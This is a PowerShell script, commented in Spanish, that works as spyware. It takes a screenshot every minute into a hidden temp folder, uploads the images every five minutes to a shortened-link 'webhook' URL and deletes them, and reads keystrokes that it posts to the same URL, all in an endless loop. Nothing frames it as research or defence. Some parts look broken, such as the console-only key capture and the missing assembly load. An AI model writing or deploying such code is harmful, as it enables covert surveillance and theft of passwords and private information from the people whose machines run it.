# Instala el proveedor NuGet si no está instalado
if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
    Write-Host "Instalando el proveedor NuGet..."
    Install-PackageProvider -Name NuGet -Force
}

# Instala el módulo InputSimulator si no está instalado
if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
    Write-Host "Instalando el módulo InputSimulator..."
    Install-Module -Name "InputSimulator" -Scope CurrentUser -Force
}

# Define la URL del webhook
$hookurl = "https://bit.ly/web_chupakbras"

# Define el intervalo de tiempo en segundos entre capturas de pantalla
$seconds = 60 # Intervalo de captura de pantalla (1 minuto)

# Define el rango de tiempo en segundos para enviar las imágenes
$sendInterval = 300 # 5 minutos

# Variable para contar las capturas
$counter = 0

# Función para capturar pulsaciones del teclado y enviarlas al webhook
function CaptureAndSendKeystrokes {
    $keystrokes = @()
    
    # Captura las pulsaciones del teclado durante 30 segundos
    $endTime = (Get-Date).AddSeconds(30)
    while ((Get-Date) -lt $endTime) {
        $key = [Console]::ReadKey($true)
        $keystrokes += $key.KeyChar
    }
    
    # Convierte las pulsaciones del teclado en una cadena y envíalas al webhook
    $keystrokesString = $keystrokes -join ""
    Invoke-WebRequest -Uri $hookurl -Method Post -Body "{""keystrokes"":""$keystrokesString""}" -ContentType "application/json"
}

# Función para tomar una captura de pantalla
function TakeScreenshot {
    # Crea un objeto Bitmap para la captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    
    # Guarda la captura de pantalla en un archivo temporal
    $Filett = "$TempFolder\SC$counter.png"
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Incrementa el contador
    $counter++
}

# Obtiene la resolución de la pantalla
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Crea la carpeta temporal para almacenar las capturas
$TempFolder = "$env:temp\sysw"
if (-not (Test-Path -Path $TempFolder)) {
    New-Item -ItemType Directory -Path $TempFolder | Out-Null
}

# Realiza la captura de pantalla y envía las capturas
while ($true) {
    # Realiza la captura de pantalla
    TakeScreenshot

    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
    if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
        Write-Host "Enviando imágenes..."
        Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
            Invoke-WebRequest -Uri $hookurl -Method Post -InFile $_.FullName
            Remove-Item -Path $_.FullName -Force
        }
        $counter = 0
    }

    # Captura pulsaciones del teclado cada 30 segundos y envíalas al webhook
    CaptureAndSendKeystrokes

    # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
    Start-Sleep $seconds
}
